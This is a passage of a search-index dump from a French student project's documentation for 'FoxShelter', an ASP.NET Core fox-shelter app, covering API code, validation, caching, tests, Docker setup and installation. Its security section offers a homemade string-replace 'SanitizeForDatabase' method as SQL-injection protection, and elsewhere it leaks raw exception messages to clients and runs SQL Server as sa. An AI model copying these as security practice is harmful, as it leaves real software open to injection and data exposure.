statusCode = context.Response.StatusCode\n        };\n\n        await context.Response.WriteAsync(JsonSerializer.Serialize(response));\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#api-et-endpoints","title":"\ud83c\udf10 API et Endpoints","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#controleurs-api","title":"Contr\u00f4leurs API","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#renardapicontroller","title":"RenardApiController","text":"<pre><code>[ApiController]\n[Route(\"api/[controller]\")]\npublic class RenardApiController : ControllerBase\n{\n    private readonly RenardService _renardService;\n\n    public RenardApiController(RenardService renardService)\n    {\n        _renardService = renardService;\n    }\n\n    [HttpGet]\n    public async Task&lt;ActionResult&lt;ApiResponse&lt;List&lt;Renard&gt;&gt;&gt;&gt; GetRenards(\n        [FromQuery] string recherche = \"\",\n        [FromQuery] EtatSante? etatSante = null)\n    {\n        try\n        {\n            var renards = await _renardService.ObtenirRenardsAsync(recherche, etatSante);\n            return Ok(new ApiResponse&lt;List&lt;Renard&gt;&gt;\n            {\n                Success = true,\n                Data = renards,\n                Message = \"Renards r\u00e9cup\u00e9r\u00e9s avec succ\u00e8s\"\n            });\n        }\n        catch (Exception ex)\n        {\n            return StatusCode(500, new ApiResponse&lt;List&lt;Renard&gt;&gt;\n            {\n                Success = false,\n                Message = ex.Message\n            });\n        }\n    }\n\n    [HttpPost]\n    public async Task&lt;ActionResult&lt;ApiResponse&lt;Renard&gt;&gt;&gt; CreateRenard([FromBody] Renard renard)\n    {\n        if (!ModelState.IsValid)\n        {\n            return BadRequest(new ApiResponse&lt;Renard&gt;\n            {\n                Success = false,\n                Message = \"Donn\u00e9es invalides\",\n                Errors = ModelState.Values.SelectMany(v =&gt; v.Errors.Select(e =&gt; e.ErrorMessage))\n            });\n        }\n\n        try\n        {\n            var nouveauRenard = await _renardService.CreerRenardAsync(renard);\n            return CreatedAtAction(nameof(GetRenard), new { id = nouveauRenard.Id }, \n                new ApiResponse&lt;Renard&gt;\n                {\n                    Success = true,\n                    Data = nouveauRenard,\n                    Message = \"Renard cr\u00e9\u00e9 avec succ\u00e8s\"\n                });\n        }\n        catch (Exception ex)\n        {\n            return StatusCode(500, new ApiResponse&lt;Renard&gt;\n            {\n                Success = false,\n                Message = ex.Message\n            });\n        }\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#modeles-de-reponse-api","title":"Mod\u00e8les de R\u00e9ponse API","text":"<pre><code>public class ApiResponse&lt;T&gt;\n{\n    public bool Success { get; set; }\n    public T Data { get; set; }\n    public string Message { get; set; }\n    public IEnumerable&lt;string&gt; Errors { get; set; } = new List&lt;string&gt;();\n}\n\npublic class PaginatedResponse&lt;T&gt; : ApiResponse&lt;T&gt;\n{\n    public int Page { get; set; }\n    public int PageSize { get; set; }\n    public int TotalCount { get; set; }\n    public int TotalPages { get; set; }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#securite","title":"\ud83d\udd12 S\u00e9curit\u00e9","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#validation-des-donnees","title":"Validation des Donn\u00e9es","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#validation-cote-serveur","title":"Validation C\u00f4t\u00e9 Serveur","text":"<pre><code>public class RenardValidator : AbstractValidator&lt;Renard&gt;\n{\n    public RenardValidator()\n    {\n        RuleFor(r =&gt; r.Nom)\n            .NotEmpty().WithMessage(\"Le nom est obligatoire\")\n            .Length(2, 50).WithMessage(\"Le nom doit contenir entre 2 et 50 caract\u00e8res\")\n            .Matches(@\"^[a-zA-Z\u00c0-\u00ff\\s-']+$\").WithMessage(\"Le nom contient des caract\u00e8res invalides\");\n\n        RuleFor(r =&gt; r.Age)\n            .InclusiveBetween(0, 20).WithMessage(\"L'\u00e2ge doit \u00eatre entre 0 et 20 ans\");\n\n        RuleFor(r =&gt; r.Poids)\n            .GreaterThan(0).WithMessage(\"Le poids doit \u00eatre positif\")\n            .LessThanOrEqualTo(50).WithMessage(\"Le poids ne peut pas d\u00e9passer 50 kg\");\n\n        RuleFor(r =&gt; r.Sexe)\n            .Must(s =&gt; s == 'M' || s == 'F').WithMessage(\"Le sexe doit \u00eatre M ou F\");\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#protection-csrf","title":"Protection CSRF","text":"<pre><code>// Dans Program.cs\nbuilder.Services.AddAntiforgery(options =&gt;\n{\n    options.HeaderName = \"X-CSRF-TOKEN\";\n    options.SuppressXFrameOptionsHeader = false;\n});\n\n// Dans les vues\n@Html.AntiForgeryToken()\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#sanitisation-des-entrees","title":"Sanitisation des Entr\u00e9es","text":"<pre><code>public static class InputSanitizer\n{\n    public static string SanitizeHtml(string input)\n    {\n        if (string.IsNullOrEmpty(input)) return string.Empty;\n\n        return HttpUtility.HtmlEncode(input);\n    }\n\n    public static string SanitizeForDatabase(string input)\n    {\n        if (string.IsNullOrEmpty(input)) return string.Empty;\n\n        // Supprimer les caract\u00e8res dangereux\n        return input.Replace(\"'\", \"''\")\n                   .Replace(\"--\", \"\")\n                   .Replace(\"/*\", \"\")\n                   .Replace(\"*/\", \"\");\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#performance-et-optimisation","title":"\u26a1 Performance et Optimisation","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#optimisations-entity-framework","title":"Optimisations Entity Framework","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#requetes-efficaces","title":"Requ\u00eates Efficaces","text":"<pre><code>public async Task&lt;List&lt;Renard&gt;&gt; ObtenirRenardsAvecDetailsAsync()\n{\n    return await _context.Renards\n        .Include(r =&gt; r.RegimeAlimentaire)\n        .Include(r =&gt; r.SoinsVeterinaires.OrderByDescending(s =&gt; s.DateSoin).Take(5))\n        .Where(r =&gt; !r.EstAdopte)\n        .AsNoTracking() // Pour les lectures seules\n        .ToListAsync();\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#pagination","title":"Pagination","text":"<pre><code>public async Task&lt;PaginatedResult&lt;Renard&gt;&gt; ObtenirRenardsPageAsync(int page, int pageSize)\n{\n    var query = _context.Renards.AsQueryable();\n    var totalCount = await query.CountAsync();\n\n    var items = await query\n        .Skip((page - 1) * pageSize)\n        .Take(pageSize)\n        .ToListAsync();\n\n    return new PaginatedResult&lt;Renard&gt;\n    {\n        Items = items,\n        Page = page,\n        PageSize = pageSize,\n        TotalCount = totalCount,\n        TotalPages = (int)Math.Ceiling((double)totalCount / pageSize)\n    };\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#cache","title":"Cache","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#cache-en-memoire","title":"Cache en M\u00e9moire","text":"<pre><code>public class CachedRenardService : IRenardService\n{\n    private readonly RenardService _renardService;\n    private readonly IMemoryCache _cache;\n    private readonly TimeSpan _cacheDuration = TimeSpan.FromMinutes(5);\n\n    public CachedRenardService(RenardService renardService, IMemoryCache cache)\n    {\n        _renardService = renardService;\n        _cache = cache;\n    }\n\n    public async Task&lt;StatistiquesRenards&gt; ObtenirStatistiquesAsync()\n    {\n        const string cacheKey = \"statistiques_renards\";\n\n        if (_cache.TryGetValue(cacheKey, out StatistiquesRenards cachedStats))\n        {\n            return cachedStats;\n        }\n\n        var stats = await _renardService.ObtenirStatistiquesAsync();\n        _cache.Set(cacheKey, stats, _cacheDuration);\n\n        return stats;\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#patterns-et-bonnes-pratiques","title":"\ud83c\udfaf Patterns et Bonnes Pratiques","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#dependency-injection","title":"Dependency Injection","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#configuration-des-services","title":"Configuration des Services","text":"<pre><code>// Program.cs\nbuilder.Services.AddDbContext&lt;FoxShelterContext&gt;(options =&gt;\n    options.UseSqlServer(connectionString));\n\nbuilder.Services.AddScoped&lt;IRenardService, RenardService&gt;();\nbuilder.Services.AddScoped&lt;IValidator&lt;Renard&gt;, RenardValidator&gt;();\n\n// D\u00e9corateur pour le cache\nbuilder.Services.Decorate&lt;IRenardService, CachedRenardService&gt;();\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#repository-pattern-optionnel","title":"Repository Pattern (Optionnel)","text":"<pre><code>public interface IRepository&lt;T&gt; where T : class\n{\n    Task&lt;T&gt; GetByIdAsync(int id);\n    Task&lt;IEnumerable&lt;T&gt;&gt; GetAllAsync();\n    Task&lt;T&gt; AddAsync(T entity);\n    Task UpdateAsync(T entity);\n    Task DeleteAsync(int id);\n}\n\npublic class Repository&lt;T&gt; : IRepository&lt;T&gt; where T : class\n{\n    protected readonly FoxShelterContext _context;\n    protected readonly DbSet&lt;T&gt; _dbSet;\n\n    public Repository(FoxShelterContext context)\n    {\n        _context = context;\n        _dbSet = context.Set&lt;T&gt;();\n    }\n\n    public virtual async Task&lt;T&gt; GetByIdAsync(int id)\n    {\n        return await _dbSet.FindAsync(id);\n    }\n\n    public virtual async Task&lt;IEnumerable&lt;T&gt;&gt; GetAllAsync()\n    {\n        return await _dbSet.ToListAsync();\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#unit-of-work-pattern","title":"Unit of Work Pattern","text":"<pre><code>public interface IUnitOfWork : IDisposable\n{\n    IRepository&lt;Renard&gt; Renards { get; }\n    IRepository&lt;SoinVeterinaire&gt; SoinsVeterinaires { get; }\n    Task&lt;int&gt; SaveChangesAsync();\n}\n\npublic class UnitOfWork : IUnitOfWork\n{\n    private readonly FoxShelterContext _context;\n\n    public UnitOfWork(FoxShelterContext context)\n    {\n        _context = context;\n        Renards = new Repository&lt;Renard&gt;(_context);\n        SoinsVeterinaires = new Repository&lt;SoinVeterinaire&gt;(_context);\n    }\n\n    public IRepository&lt;Renard&gt; Renards { get; }\n    public IRepository&lt;SoinVeterinaire&gt; SoinsVeterinaires { get; }\n\n    public async Task&lt;int&gt; SaveChangesAsync()\n    {\n        return await _context.SaveChangesAsync();\n    }\n\n    public void Dispose()\n    {\n        _context.Dispose();\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#tests","title":"\ud83e\uddea Tests","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#tests-unitaires","title":"Tests Unitaires","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#test-des-services","title":"Test des Services","text":"<pre><code>[TestClass]\npublic class RenardServiceTests\n{\n    private FoxShelterContext _context;\n    private RenardService _service;\n\n    [TestInitialize]\n    public void Setup()\n    {\n        var options = new DbContextOptionsBuilder&lt;FoxShelterContext&gt;()\n            .UseInMemoryDatabase(databaseName: Guid.NewGuid().ToString())\n            .Options;\n\n        _context = new FoxShelterContext(options);\n        _service = new RenardService(_context, Mock.Of&lt;ILogger&lt;RenardService&gt;&gt;());\n    }\n\n    [TestMethod]\n    public async Task CreerRenard_AvecDonneesValides_RetourneRenard()\n    {\n        // Arrange\n        var renard = new Renard\n        {\n            Nom = \"Test\",\n            Espece = \"Renard roux\",\n            Age = 2,\n            Sexe = 'M',\n            Poids = 5.5m,\n            EtatSante = EtatSante.Bon,\n            RegimeAlimentaireId = 1\n        };\n\n        // Act\n        var result = await _service.CreerRenardAsync(renard);\n\n        // Assert\n        Assert.IsNotNull(result);\n        Assert.AreEqual(\"Test\", result.Nom);\n        Assert.IsTrue(result.Id &gt; 0);\n    }\n\n    [TestMethod]\n    public async Task CreerRenard_AvecNomDuplique_LeveException()\n    {\n        // Arrange\n        var renard1 = new Renard { Nom = \"Duplicate\", /* autres propri\u00e9t\u00e9s */ };\n        var renard2 = new Renard { Nom = \"Duplicate\", /* autres propri\u00e9t\u00e9s */ };\n\n        await _service.CreerRenardAsync(renard1);\n\n        // Act &amp; Assert\n        await Assert.ThrowsExceptionAsync&lt;InvalidOperationException&gt;(\n            () =&gt; _service.CreerRenardAsync(renard2));\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#tests-dintegration","title":"Tests d'Int\u00e9gration","text":"<pre><code>[TestClass]\npublic class RenardControllerIntegrationTests\n{\n    private WebApplicationFactory&lt;Program&gt; _factory;\n    private HttpClient _client;\n\n    [TestInitialize]\n    public void Setup()\n    {\n        _factory = new WebApplicationFactory&lt;Program&gt;()\n            .WithWebHostBuilder(builder =&gt;\n            {\n                builder.ConfigureServices(services =&gt;\n                {\n                    // Remplacer la base de donn\u00e9es par une base en m\u00e9moire\n                    services.RemoveAll&lt;DbContextOptions&lt;FoxShelterContext&gt;&gt;();\n                    services.AddDbContext&lt;FoxShelterContext&gt;(options =&gt;\n                        options.UseInMemoryDatabase(\"TestDb\"));\n                });\n            });\n\n        _client = _factory.CreateClient();\n    }\n\n    [TestMethod]\n    public async Task Get_Index_RetournePageAvecRenards()\n    {\n        // Act\n        var response = await _client.GetAsync(\"/Renard\");\n\n        // Assert\n        response.EnsureSuccessStatusCode();\n        var content = await response.Content.ReadAsStringAsync();\n        Assert.IsTrue(content.Contains(\"Liste des Renards\"));\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#deploiement","title":"\ud83d\ude80 D\u00e9ploiement","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#configuration-de-production","title":"Configuration de Production","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#appsettingsproductionjson","title":"appsettings.Production.json","text":"<pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=prod-server;Database=FoxShelterDB;User Id=app_user;Password=${DB_PASSWORD};TrustServerCertificate=true\"\n  },\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Warning\",\n      \"Microsoft.AspNetCore\": \"Warning\"\n    }\n  },\n  \"FoxShelter\": {\n    \"EmailUrgence\": \"urgence@foxshelter.fr\",\n    \"CapaciteMaximale\": 100\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#docker","title":"Docker","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#dockerfile","title":"Dockerfile","text":"<pre><code>FROM mcr.microsoft.com/dotnet/aspnet:8.0 AS base\nWORKDIR /app\nEXPOSE 80\nEXPOSE 443\n\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\nWORKDIR /src\nCOPY [\"FoxShelter.csproj\", \".\"]\nRUN dotnet restore \"FoxShelter.csproj\"\nCOPY . .\nRUN dotnet build \"FoxShelter.csproj\" -c Release -o /app/build\n\nFROM build AS publish\nRUN dotnet publish \"FoxShelter.csproj\" -c Release -o /app/publish\n\nFROM base AS final\nWORKDIR /app\nCOPY --from=publish /app/publish .\nENTRYPOINT [\"dotnet\", \"FoxShelter.dll\"]\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#docker-composeyml","title":"docker-compose.yml","text":"<pre><code>version: '3.8'\nservices:\n  foxshelter-app:\n    build: .\n    ports:\n      - \"8080:80\"\n    environment:\n      - ASPNETCORE_ENVIRONMENT=Production\n      - ConnectionStrings__DefaultConnection=Server=db;Database=FoxShelterDB;User Id=sa;Password=YourPassword123!\n    depends_on:\n      - db\n\n  db:\n    image: mcr.microsoft.com/mssql/server:2022-latest\n    environment:\n      - ACCEPT_EULA=Y\n      - SA_PASSWORD=YourPassword123!\n    ports:\n      - \"1433:1433\"\n    volumes:\n      - sqldata:/var/opt/mssql\n\nvolumes:\n  sqldata:\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#monitoring-et-logs","title":"\ud83d\udcca Monitoring et Logs","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#configuration-des-logs","title":"Configuration des Logs","text":"<pre><code>// Program.cs\nbuilder.Logging.ClearProviders();\nbuilder.Logging.AddConsole();\nbuilder.Logging.AddDebug();\n\nif (builder.Environment.IsProduction())\n{\n    builder.Logging.AddFile(\"Logs/foxshelter-{Date}.txt\");\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#metriques-personnalisees","title":"M\u00e9triques Personnalis\u00e9es","text":"<pre><code>public class MetricsService\n{\n    private readonly ILogger&lt;MetricsService&gt; _logger;\n\n    public void LogRenardCreation(string nom)\n    {\n        _logger.LogInformation(\"Nouveau renard cr\u00e9\u00e9: {Nom} \u00e0 {Timestamp}\", nom, DateTime.Now);\n    }\n\n    public void LogAdoption(string nom)\n    {\n        _logger.LogInformation(\"Renard adopt\u00e9: {Nom} \u00e0 {Timestamp}\", nom, DateTime.Now);\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#evolutions-futures","title":"\ud83d\udd2e \u00c9volutions Futures","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#fonctionnalites-prevues","title":"Fonctionnalit\u00e9s Pr\u00e9vues","text":"<ol> <li>Authentification et Autorisation</li> <li>Syst\u00e8me de connexion utilisateur</li> <li>R\u00f4les (Admin, V\u00e9t\u00e9rinaire, B\u00e9n\u00e9vole)</li> <li> <p>Permissions granulaires</p> </li> <li> <p>Notifications</p> </li> <li>Emails automatiques</li> <li>SMS pour urgences</li> <li> <p>Notifications push</p> </li> <li> <p>Rapports Avanc\u00e9s</p> </li> <li>G\u00e9n\u00e9ration PDF</li> <li>Graphiques interactifs</li> <li> <p>Export Excel</p> </li> <li> <p>API Mobile</p> </li> <li>Application mobile</li> <li>Synchronisation offline</li> <li>G\u00e9olocalisation</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#architecture-evolutive","title":"Architecture \u00c9volutive","text":"<pre><code>// Interface pour futurs services\npublic interface INotificationService\n{\n    Task EnvoyerNotificationUrgenceAsync(Renard renard);\n    Task EnvoyerRappelSuiviAsync(SoinVeterinaire soin);\n}\n\npublic interface IReportService\n{\n    Task&lt;byte[]&gt; GenererRapportPdfAsync(int renardId);\n    Task&lt;Stream&gt; ExporterDonneesExcelAsync();\n}\n</code></pre> <p>Documentation Technique FoxShelter - Version 1.0 Derni\u00e8re mise \u00e0 jour : Janvier 2024</p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/","title":"Guide d'Installation FoxShelter","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#table-des-matieres","title":"\ud83d\udccb Table des Mati\u00e8res","text":"<ol> <li>Pr\u00e9requis Syst\u00e8me</li> <li>Installation des Outils</li> <li>Configuration de l'Environnement</li> <li>Installation du Projet</li> <li>Configuration de la Base de Donn\u00e9es</li> <li>Premier Lancement</li> <li>V\u00e9rification de l'Installation</li> <li>D\u00e9pannage</li> <li>Configuration Avanc\u00e9e</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#prerequis-systeme","title":"\ud83d\udcbb Pr\u00e9requis Syst\u00e8me","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#configuration-minimale","title":"Configuration Minimale","text":"<ul> <li>OS : Windows 10/11, macOS 10.15+, ou Linux (Ubuntu 18.04+)</li> <li>RAM : 4 GB minimum, 8 GB recommand\u00e9</li> <li>Stockage : 2 GB d'espace libre</li> <li>Processeur : x64 compatible</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#configuration-recommandee","title":"Configuration Recommand\u00e9e","text":"<ul> <li>OS : Windows 11 ou macOS 12+</li> <li>RAM : 16 GB</li> <li>Stockage : SSD avec 10 GB d'espace libre</li> <li>Processeur : Intel i5/AMD Ryzen 5 ou sup\u00e9rieur</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#installation-des-outils","title":"\ud83d\udee0\ufe0f Installation des Outils","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-visual-studio-2022","title":"1. Visual Studio 2022","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#windows","title":"Windows","text":"<ol> <li>T\u00e9l\u00e9charger Visual Studio 2022 Community</li> <li>Lancer l'installateur</li> <li>S\u00e9lectionner les charges de travail :</li> <li>D\u00e9veloppement web et ASP.NET</li> <li>D\u00e9veloppement .NET Desktop</li> <li>Stockage et traitement des donn\u00e9es</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#composants-requis","title":"Composants Requis","text":"<ul> <li>.NET 8.0 SDK</li> <li>Entity Framework Core Tools</li> <li>SQL Server Express LocalDB</li> <li>Git pour Windows</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-net-8-sdk","title":"2. .NET 8 SDK","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#verification-de-linstallation","title":"V\u00e9rification de l'Installation","text":"<pre><code>dotnet --version\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#installation-manuelle","title":"Installation Manuelle","text":"<p>Si .NET 8 n'est pas install\u00e9 :</p> <p>Windows : <pre><code># Via winget\nwinget install Microsoft.DotNet.SDK.8\n\n# Ou t\u00e9l\u00e9charger depuis https://dotnet.microsoft.com/download\n</code></pre></p> <p>macOS : <pre><code># Via Homebrew\nbrew install --cask dotnet-sdk\n\n# Ou t\u00e9l\u00e9charger depuis https://dotnet.microsoft.com/download\n</code></pre></p> <p>Linux (Ubuntu) : <pre><code># Ajouter le repository Microsoft\nwget https://packages.microsoft.com/config/ubuntu/22.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb\nsudo dpkg -i packages-microsoft-prod.deb\n\n# Installer .NET 8\nsudo apt-get update\nsudo apt-get install -y dotnet-sdk-8.0\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#3-sql-server","title":"3. SQL Server","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#option-a-sql-server-express-localdb-recommande","title":"Option A : SQL Server Express LocalDB (Recommand\u00e9)","text":"<p>Windows : - Inclus avec Visual Studio 2022 - Ou t\u00e9l\u00e9charger SQL Server Express</p> <p>V\u00e9rification : <pre><code>sqllocaldb info\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#option-b-sql-server-express","title":"Option B : SQL Server Express","text":"<p>Windows : 1. T\u00e9l\u00e9charger SQL Server Express 2. Installer avec les options par d\u00e9faut 3. Noter l'instance : <code>.\\SQLEXPRESS</code></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#option-c-sql-server-developer-gratuit","title":"Option C : SQL Server Developer (Gratuit)","text":"<p>Pour un environnement de d\u00e9veloppement complet : 1. T\u00e9l\u00e9charger SQL Server Developer 2. Installer SQL Server Management Studio (SSMS)</p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#4-git","title":"4. Git","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#installation","title":"Installation","text":"<p>Windows : <pre><code>winget install Git.Git\n</code></pre></p> <p>macOS : <pre><code>brew install git\n</code></pre></p> <p>Linux : <pre><code>sudo apt-get install git\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#configuration-initiale","title":"Configuration Initiale","text":"<pre><code>git config --global user.name \"Votre Nom\"\ngit config --global user.email \"votre.email@example.com\"\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#configuration-de-lenvironnement","title":"\u2699\ufe0f Configuration de l'Environnement","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-variables-denvironnement","title":"1. Variables d'Environnement","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#windows_1","title":"Windows","text":"<pre><code># Ajouter .NET CLI aux variables PATH (g\u00e9n\u00e9ralement automatique)\nsetx PATH \"%PATH%;C:\\Program Files\\dotnet\"\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#macoslinux","title":"macOS/Linux","text":"<pre><code># Ajouter \u00e0 ~/.bashrc ou ~/.zshrc\nexport PATH=\"$PATH:/usr/local/share/dotnet\"\nexport DOTNET_ROOT=\"/usr/local/share/dotnet\"\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-verification-des-outils","title":"2. V\u00e9rification des Outils","text":"<pre><code># V\u00e9rifier .NET\ndotnet --version\ndotnet --list-sdks\n\n# V\u00e9rifier Entity Framework Tools\ndotnet ef --version\n\n# V\u00e9rifier Git\ngit --version\n\n# V\u00e9rifier SQL Server LocalDB (Windows)\nsqllocaldb info\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#installation-du-projet","title":"\ud83d\udce6 Installation du Projet","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-cloner-le-repository","title":"1. Cloner le Repository","text":"<pre><code># Cr\u00e9er un dossier de travail\nmkdir C:\\Dev\\FoxShelter  # Windows\nmkdir ~/Dev/FoxShelter   # macOS/Linux\n\n# Naviguer vers le dossier\ncd C:\\Dev\\FoxShelter     # Windows\ncd ~/Dev/FoxShelter      # macOS/Linux\n\n# Cloner le projet (remplacer par l'URL r\u00e9elle)\ngit clone https://github.com/votre-repo/foxshelter.git .\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-restaurer-les-packages-nuget","title":"2. Restaurer les Packages NuGet","text":"<pre><code># Naviguer vers le dossier du projet\ncd FoxShelter\n\n# Restaurer les d\u00e9pendances\ndotnet restore\n\n# V\u00e9rifier la restauration\ndotnet list package\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#3-verifier-la-structure-du-projet","title":"3. V\u00e9rifier la Structure du Projet","text":"<pre><code>FoxShelter/\n\u251c\u2500\u2500 Controllers/\n\u251c\u2500\u2500 Models/\n\u251c\u2500\u2500 Views/\n\u251c\u2500\u2500 Services/\n\u251c\u2500\u2500 Data/\n\u251c\u2500\u2500 wwwroot/\n\u251c\u2500\u2500 FoxShelter.csproj\n\u251c\u2500\u2500 Program.cs\n\u2514\u2500\u2500 appsettings.json\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#configuration-de-la-base-de-donnees","title":"\ud83d\uddc4\ufe0f Configuration de la Base de Donn\u00e9es","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#1-configuration-de-la-chaine-de-connexion","title":"1. Configuration de la Cha\u00eene de Connexion","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#option-a-sql-server-localdb-par-defaut","title":"Option A : SQL Server LocalDB (Par d\u00e9faut)","text":"<p>Le fichier <code>appsettings.json</code> contient d\u00e9j\u00e0 : <pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=(localdb)\\\\mssqllocaldb;Database=FoxShelterDB;Trusted_Connection=true;MultipleActiveResultSets=true\"\n  }\n}\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#option-b-sql-server-express_1","title":"Option B : SQL Server Express","text":"<p>Modifier <code>appsettings.json</code> : <pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=.\\\\SQLEXPRESS;Database=FoxShelterDB;Trusted_Connection=true;MultipleActiveResultSets=true\"\n  }\n}\n</code></pre></p>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#option-c-sql-server-avec-authentification","title":"Option C : SQL Server avec Authentification","text":"<pre><code>{\n  \"ConnectionStrings\": {\n    \"DefaultConnection\": \"Server=localhost;Database=FoxShelterDB;User Id=sa;Password=VotreMotDePasse;TrustServerCertificate=true;MultipleActiveResultSets=true\"\n  }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#2-installation-des-outils-entity-framework","title":"2. Installation des Outils Entity Framework","text":"<pre><code># Installer les outils EF globalement\ndotnet tool install --global dotnet-ef\n\n# V\u00e9rifier l'installation\ndotnet ef --version\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#3-creation-de-la-base-de-donnees","title":"3. Cr\u00e9ation de la Base de Donn\u00e9es","text":""},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#methode-1-migrations-entity-framework","title":"M\u00e9thode 1 : Migrations Entity Framework","text":"<pre><code># Cr\u00e9er la migration initiale (si pas d\u00e9j\u00e0 fait)\ndotnet ef migrations add InitialCreate\n\n# Appliquer les migrations\ndotnet ef database update\n\n# V\u00e9rifier les migrations\ndotnet ef migrations list\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/GuideInstallation/#methode-2-script-sql-manuel","title":"M\u00e9thode 2 : Script SQL Manuel","text":"<p>Si vous pr\u00e9f\u00e9rez cr\u00e9er la base manuellement :</p> <pre><code>-- Se connecter \u00e0 SQL Server et ex\u00e9cuter :\nCREATE DATABASE FoxShelterDB;\nGO\n\nUSE FoxShelterDB;\nGO\n\n-- Les tables seront cr\u00e9\u00e9es automatiquement au premier 